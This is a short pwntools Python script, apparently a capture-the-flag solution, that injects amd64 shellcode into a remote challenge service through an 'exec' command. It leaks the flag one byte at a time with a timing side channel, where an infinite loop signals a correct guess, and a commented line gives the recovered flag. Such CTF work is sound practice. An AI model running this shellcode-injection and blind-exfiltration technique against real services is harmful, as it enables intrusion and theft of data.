from pwn import *

context.arch = 'amd64'
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug('./patch', gdbscript='breakrva 0x14C7\n')
# flag = 'FLAG{5ee_thr0ugh_th3_b1ind3d_3y3s}'
flag = 'F'
for idx in range(1, 50):
    for asc in range(32, 127):
        # p = process('./patch')
        print(f'flag = {flag}, index = {idx}, ascii = {chr(asc)}')
        p = remote('eofqual.zoolab.org', 10101)
        # pause()
        p.sendlineafter('$ ', 'loadflag')
        shellcode = f'''
                        pop rax
                        sub ax, 0x14c9     /* pie base */
                        add ax, 0x40E0     /* flag address 0x40E0*/
                        add al, {idx}
                        xor rbx, rbx
                        mov bl, byte ptr [rax]
                        cmp bl, {asc}
                        jne exit
                    Loop:
                        jmp Loop
                    exit:
                        xor rax, rax
                        mov al, 60
                        syscall
                    '''
        shellcode = asm(shellcode)

        try:
            payload = b'exec ' + shellcode
            p.sendline(payload)
            p.recv(timeout=0.3)
            p.recv(timeout=0.3)
            flag += chr(asc)
            p.close()
            break
        except EOFError:
            p.close()
            continue
        finally:
            if asc == 126:
                exit(0)
